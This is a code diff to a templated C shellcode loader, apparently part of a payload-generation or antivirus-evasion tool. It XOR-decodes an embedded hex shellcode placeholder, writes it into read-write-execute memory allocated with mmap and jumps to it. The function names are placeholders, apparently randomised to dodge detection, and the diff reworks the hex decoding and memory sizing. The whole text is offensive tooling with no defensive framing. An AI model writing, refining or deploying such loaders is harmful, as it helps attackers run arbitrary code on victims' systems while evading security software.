@@ -18,22 +18,6 @@
 
 unsigned char hexbuffer[] = "{{SHELLCODE_STR}}";
 
-void {{FUNCTION1}}(char* str, unsigned char* out) {
-    char* p = str;
-    char high = 0, low = 0;
-    int tmplen = strlen(p);
-    int cnt = 0;
-    tmplen = strlen(p);
-    while (cnt < (tmplen / 2)) {
-        high = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
-        low = (*(++p) > '9' && ((*p <= 'F') || (*p <= 'f'))) ? *(p)-48 - 7 : *(p)-48;
-        out[cnt] = ((high & 0x0f) << 4 | (low & 0x0f));
-        p++;
-        cnt++;
-    }
-    if (tmplen % 2 != 0) out[cnt] = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
-    return;
-}
 
 char *{{FUNCTION2}}(char *str)
 {
@@ -48,6 +32,18 @@ char *{{FUNCTION2}}(char *str)
         *p1 ^= *p2;
     }
     return str;
+}
+
+unsigned int {{FUNCTION1}}(char* hexbuffer) {
+    {{FUNCTION2}}(hexbuffer);
+    unsigned int char_in_hex;
+    unsigned int iterations = strlen(hexbuffer);
+    unsigned int memory_allocation = strlen(hexbuffer) / 2;
+    for (unsigned int i = 0; i < iterations - 1; i++) {
+        sscanf(hexbuffer + 2 * i, "%2X", &char_in_hex);
+        hexbuffer[i] = (char)char_in_hex;
+    }
+    return memory_allocation;
 }
 
 int main(int argc, char **argv)
@@ -65,11 +61,10 @@ int main(int argc, char **argv)
         printf("[+] Stage 2\n");
         exit(0);
     }
-    {{FUNCTION2}}(hexbuffer);
-    unsigned char buffer[409600] = { 0 };
-    {{FUNCTION1}}(hexbuffer, buffer);
-    void *ptr = mmap(0, sizeof(buffer), PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
-    memcpy(ptr,buffer,sizeof buffer);
+
+    unsigned int memory_allocation = {{FUNCTION1}}(hexbuffer);
+    void *ptr = mmap(0, memory_allocation, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
+    memcpy(ptr,hexbuffer,memory_allocation);
     void (*fp)() = (void (*)())ptr;
     fp();
     printf ("\n[-] Exploit failed \n");
